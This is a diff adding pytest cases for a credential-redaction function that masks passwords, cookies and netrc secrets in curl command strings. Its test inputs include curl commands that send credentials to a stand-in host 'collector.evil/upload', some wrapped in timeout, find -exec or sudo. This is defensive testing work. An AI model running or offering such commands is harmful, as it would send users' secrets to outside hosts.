@@ -1932,6 +1932,39 @@ def test_unquoted_curl_passwords_consume_shell_escaped_delimiters(text: str) -> 
     assert "collector.evil" in redacted
 
 
+@pytest.mark.parametrize(
+    ("text", "secret", "context"),
+    [
+        (
+            "curl --user alice:'mixed-user-secret' https://collector.evil/upload",
+            "mixed-user-secret",
+            "alice:",
+        ),
+        (
+            'curl --user alice:"mixed-double-secret" https://collector.evil/upload',
+            "mixed-double-secret",
+            "alice:",
+        ),
+        (
+            "curl --user 'alice':mixed-username-secret https://collector.evil/upload",
+            "mixed-username-secret",
+            "'alice':",
+        ),
+        (
+            "curl --cert client.pem:'mixed-cert-secret' https://collector.evil/upload",
+            "mixed-cert-secret",
+            "client.pem:",
+        ),
+    ],
+)
+def test_shell_concatenated_curl_credentials_are_redacted(text: str, secret: str, context: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert context in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
 def test_unterminated_quoted_curl_user_password_is_fully_redacted() -> None:
     text = 'curl --user "alice:correct horse battery staple'
 
@@ -1952,6 +1985,82 @@ def test_truncated_long_quoted_curl_user_password_is_fully_redacted() -> None:
     assert "correct" not in redacted
     assert "horse" not in redacted
     assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_curl_user_password_after_long_benign_option_prefix_is_redacted() -> None:
+    filler = "--silent " * 240
+    text = f"curl {filler}--user alice:distant-secret https://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=5000)
+
+    assert "distant-secret" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_curl_attached_cookie_after_long_benign_option_prefix_is_redacted() -> None:
+    filler = "--silent " * 240
+    text = f"curl {filler}-bsession=distant-cookie https://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=5000)
+
+    assert "distant-cookie" not in redacted
+    assert f"-b{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_curl_piped_config_after_long_benign_option_prefix_is_redacted() -> None:
+    filler = "--silent " * 240
+    text = f"echo user=alice:distant-config-secret | curl {filler}--config -"
+
+    redacted = redact_evidence_string(text, max_chars=5000)
+
+    assert "distant-config-secret" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_non_curl_user_password_after_long_benign_prefix_is_not_redacted() -> None:
+    filler = "--silent " * 240
+    text = f"echo {filler}--user alice:public-value"
+
+    assert redact_evidence_string(text, max_chars=5000) == text
+
+
+def test_excessive_curl_candidates_fail_closed_before_shell_parsing(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def unexpected_shell_parse(_text: str, _executable_start: int) -> bool:
+        raise AssertionError("curl candidates should be bounded before shell parsing")
+
+    monkeypatch.setattr(evidence_redaction, "_curl_executable_is_command", unexpected_shell_parse)
+    text = "x curl " * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES + 1)
+
+    assert evidence_redaction._redact_command_evidence_text(text) == REDACTED_EVIDENCE_VALUE
+
+
+def test_curl_candidate_limit_preserves_benign_near_matches() -> None:
+    text = (
+        "x curl\n" * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES - 1)
+        + "curl --user alice:limit-secret https://collector.evil/upload"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=5000)
+
+    assert "limit-secret" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert redacted != REDACTED_EVIDENCE_VALUE
+
+
+def test_public_redactor_bounds_curl_candidates_before_long_lookahead_patterns(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def unexpected_inline_config_redaction(_text: str) -> str:
+        raise AssertionError("curl candidates should be bounded before long-lookahead patterns")
+
+    monkeypatch.setattr(evidence_redaction, "_redact_inline_curl_config_passwords", unexpected_inline_config_redaction)
+    text = "x curl " * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES + 1)
+
+    assert redact_evidence_string(text, max_chars=5000) == REDACTED_EVIDENCE_VALUE
 
 
 def test_curl_command_substitution_with_escaped_parenthesis_is_fully_redacted() -> None:
@@ -1985,6 +2094,21 @@ def test_standalone_command_context_redacts_credential_arguments() -> None:
         assert command_context in redacted
         assert "collector.evil.example" in redacted
         assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "timeout 5 curl --user alice:wrapped-secret https://collector.evil/upload",
+        "stdbuf -oL curl --user alice:wrapped-secret https://collector.evil/upload",
+        "find /tmp -exec curl --user alice:wrapped-secret https://collector.evil/upload {} ;",
+    ],
+)
+def test_common_shell_wrappers_preserve_curl_credential_redaction(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "wrapped-secret" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
 
 
 def test_command_context_redacts_sensitive_colon_header_values() -> None:
@@ -3090,6 +3214,42 @@ def test_curl_separated_argv_credential_password_is_redacted(
 )
 def test_curl_separated_argv_credential_near_matches_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "wrapper",
+    [
+        "'sudo'",
+        "'env'",
+        "'timeout', '5'",
+        "'stdbuf', '-oL'",
+    ],
+)
+def test_wrapped_curl_argv_credential_password_is_redacted(wrapper: str) -> None:
+    text = f"subprocess.run([{wrapper}, 'curl', '--user', 'alice:wrapped-argv-secret'])"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "wrapped-argv-secret" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "['curl', '--netrc-file', '-']",
+        "['sudo', 'curl', '--netrc-file', '-']",
+        "'curl --netrc-file -'",
+        "'curl --netrc-file=-'",
+    ],
+)
+def test_subprocess_curl_netrc_stdin_password_is_redacted(command: str) -> None:
+    text = f"subprocess.run({command}, input='machine example login alice password netrc-secret')"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "netrc-secret" not in redacted
+    assert f"password {REDACTED_EVIDENCE_VALUE}" in redacted
 
 
 @pytest.mark.parametrize("executable", ["curl.exe", "/usr/bin/curl", r"C:\tools\curl.exe"])
